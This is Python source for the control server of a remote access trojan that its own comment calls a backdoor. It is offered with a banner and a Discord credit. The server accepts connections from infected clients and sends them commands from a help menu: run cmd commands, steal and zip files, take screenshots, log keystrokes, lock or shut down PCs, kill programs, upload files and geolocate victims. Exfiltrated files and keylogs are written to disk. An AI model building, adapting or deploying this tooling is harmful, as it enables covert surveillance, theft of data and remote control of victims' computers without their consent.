import json
import time
import base64
import socket
import colorama
import binascii
import requests
import threading

colorama.init(convert=True)

print(f"""{colorama.Fore.BLUE}  _____        _____ ____          _____ _  _______   ____   ____  _____
 |  __ \ /\   / ____|  _ \   /\   / ____| |/ /  __ \ / __ \ / __ \|  __ \ 
 | |__) /  \ | |    | |_) | /  \ | |    | ' /| |  | | |  | | |  | | |__) |
 |  ___/ /\ \| |    |  _ < / /\ \| |    |  < | |  | | |  | | |  | |  _  / 
 | |  / ____ \ |____| |_) / ____ \ |____| . \| |__| | |__| | |__| | | \ \ 
 |_| /_/    \_\_____|____/_/    \_\_____|_|\_\_____/ \____/ \____/|_|  \_|
                                                                          
                                                                          \nCoded by Crystallek#3348\nDiscord: https://dsc.gg/sens-network\nPython 3.9+ is required!\nLoading...""")

buffer_size = 1024
port = 25565 #YOU NEED TO TURN ON PORT FORWARDING ON THE SPECIFIC PORT TO MAKE THIS BACKDOOR WORK NON-LOCALLY

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((socket.gethostbyname(socket.gethostname()), port))
server.listen()

clients = []
nicknames = []

def broadcast(message):
    for client in clients:
        client.send(message)

def handle(client):
    global buffer_size
    while True:
        try:
            message = client.recv(buffer_size)
            if message.decode("utf-8").startswith("[SUCCESS]"):
                response = str(message.decode('utf-8').split(' ')[1:]).replace('[', '').replace(']', '').replace('\',', '').replace('\'', '')
                print(f"{colorama.Fore.GREEN}{message.decode('utf-8').split(' ')[0]}{colorama.Fore.RESET} {response}")
            if message.decode("utf-8").startswith("[ERROR]"):
                response = str(message.decode('utf-8').split(' ')[1:]).replace('[', '').replace(']', '').replace('\',', '').replace('\'', '')
                print(f"{colorama.Fore.RED}{message.decode('utf-8').split(' ')[0]}{colorama.Fore.RESET} {response}")
            
            if message.decode("utf-8").startswith("D") or message.decode("utf-8").startswith("Z") or message.decode("utf-8").startswith("P"): #d
                try:
                    ext = client.recv(buffer_size).decode("utf-8")
                    msg = client.recv(buffer_size)
                    
                    unix = str(round(time.time()))
                    with open(f'C:/file_{ext}_{unix}.{ext}', 'wb') as f:
                        f.write(base64.decodebytes(msg))
                    print(f"{colorama.Fore.GREEN}[SUCCESS]{colorama.Fore.RESET} Saved as C:/file_{ext}_{unix}.{ext}")
                except binascii.Error:
                    print(f"{colorama.Fore.RED}[ERROR]{colorama.Fore.RESET} Incorrect padding, change the buffer size")
                except:
                    print(f"{colorama.Fore.RED}[ERROR]{colorama.Fore.RESET} Unknown error")
            
            if message.decode("utf-8").startswith("A"):
                try:
                    msg = client.recv(buffer_size)
                    print(str(base64.decodebytes(msg)).replace(r"\r", "\r").replace(r'\n', '\n').replace("'", "")[1:])
                except binascii.Error:
                    print(f"{colorama.Fore.RED}[ERROR]{colorama.Fore.RESET} Incorrect padding, change the buffer size")
                except:
                    print(f"{colorama.Fore.RED}[ERROR]{colorama.Fore.RESET} Unknown error")
            
            if message.decode("utf-8").startswith("K"):
                timenow = time.strftime("%d-%m-%Y_%H-%M-%S")
                with open(f'C:/log_{timenow}.txt', 'wb') as f:
                    f.write(message) 
        except ConnectionResetError: 
            try:
                index = clients.index(client)
                clients.remove(client)
                nickname = nicknames[index]
                print(f"{colorama.Fore.RED}[LEAVE]: {nickname} disconnected!{colorama.Fore.RESET}")
                nicknames.remove(nickname)
                break
            except: pass

def receive():
    while True:
        global buffer_size
        client, address = server.accept()
        client.send("NICKNAME".encode("utf-8"))
        nickname = client.recv(buffer_size).decode("utf-8")
        nicknames.append(nickname)
        clients.append(client)

        print(f"{colorama.Fore.GREEN}[JOIN]: {nickname} connected!{colorama.Fore.RESET}")
        threading.Thread(target=handle, args=(client,)).start()

def heartbeat():
    while True:
        try:
            broadcast("".encode("utf-8"))
        except: pass
        time.sleep(5)

def write():
    global buffer_size
    while True:
        msg = input()

        if msg.upper().startswith("B"):
            try:
                if int(msg.removeprefix("B ").split(" ")[1]) % 1024 == 0:
                    buffer_size = int(msg.removeprefix("B ").split(" ")[1])
                    print(f"{colorama.Fore.GREEN}[SUCCESS]{colorama.Fore.RESET} Now running on {buffer_size} bytes. ({msg.removeprefix('B ').split(' ')[0]})") 
                    broadcast(msg.encode("utf-8"))
            except:
                print(f"{colorama.Fore.RED}[ERROR]:{colorama.Fore.RESET} Wrongly typed command.")

        elif msg.upper().startswith("C"):
            try:
                index = 0
                for x in nicknames:
                    if x == msg.removeprefix("C "):
                        break
                    index += 1
                nickname = nicknames[index]
                print(f"{colorama.Fore.RED}[LEAVE]: {nickname} disconnected!{colorama.Fore.RESET}")
                nicknames.remove(nickname)
                clients.pop(index)
            except Exception as e:
                print(f"{colorama.Fore.RED}[ERROR]:{colorama.Fore.RESET} {e}")

        if msg.upper().startswith("G"):
            try:
                print("Active connections (can take a while to load all):")
                for nickname in nicknames:
                    try:
                        response = json.loads(requests.get(f"https://geolocation-db.com/jsonp/{nickname}").content.decode().split("(")[1].strip(")"))
                    except:
                        response = "No response"

                    print(f"{nickname} - Country name: {response['country_name']} | State: {response['state']} | City: {response['city']}")
                if len(nicknames) == 1:
                    print("1 client online")
                else:
                    print(f"{len(nicknames)} clients online")
            except Exception as e:
                print(f"{colorama.Fore.RED}[ERROR]:{colorama.Fore.RESET} {e}")
        
        elif msg.upper().startswith("H"):
            print(f"{colorama.Fore.BLUE}" + "="*30 + " HELP " + "="*30 + f"{colorama.Fore.RESET}" + "\nA <ip> - Advanced PC information (Prints more advanced PC Info, try it yourself)\nB <ip> <byte-size> - Buffer size changer (Changes the max size of everything what is sent to/from server. Only change if you have to, it causes high memory usage!)\nC <ip> - Close connection (Closes the connection between the specific client and the server, client will not be able to reconnect until the server restarts)\nD <ip> <path-to-file> - Download (Downloads the file on the specified path)\nE <ip> <cmd-command> - Execute (Executes the specified command on the client, cmd only for now)\nF <ip> <lock/shutdown> - F for PC (Locks/Shutdowns the PC without warning)\nG - Get connections (Prints all the currently running clients)\nH - Help (Opens the help menu)\nI <ip> <path-where-to-save-temp-files> - Path changer (Choose where you want your temp files to be stored)\nK <ip> <on/off> - Keylogger (Logs the keys)\nM <ip> <message> - Pop-Up Message (Shows the pop-up message on all connected clients)\nP <ip> - Printscreen (Takes the printscreen of the screen)\nS <ip> <language> <message> - Say a message (TTS)\nT <ip> <task-name> - Task kill (Kills/closes the specified app)\nU <ip> <path-to-upload> <path-where-to-upload> - Upload (Uploads the specific file)\nW <ip> <url> <title,msg> - Windows Toast (Shows the message in the right corner, W10 and W11 only)\nZ <ip> <path-to-file> - Zip (Zips the file and sends it to the server)\n\nTIP: If you want to execute the command on all clients, set the IP as \"*\"!\nTIP: If you got the error message \"unknown file extenstion:\", don't forget to run the I command!\nTIP: If you got black lines in files you downloaded, change the buffer size!\nTIP: If the server starts to glitch out, restart it. The server is still in the beta. Client should work 100% if inputs are correct.")

        elif msg.upper().startswith("U"):
            try:
                broadcast(f"U {msg.split(' ')[1]}".encode("utf-8"))
                time.sleep(0.1)
                broadcast(msg.split(" ")[3].encode("utf-8"))
                time.sleep(0.1)
                with open(msg.split(' ')[2], 'rb') as f:
                        broadcast(base64.encodebytes(f.read()))
            except:
                print(f"{colorama.Fore.RED}[ERROR]:{colorama.Fore.RESET} Wrong path.")
        
        else:
            broadcast(msg.encode("utf-8"))

print(f"\nServer has successfully started!\nIP: {requests.get('https://api.ipify.org').text}:{port}{colorama.Fore.RESET}\n")
threading.Thread(target=write).start()
receive()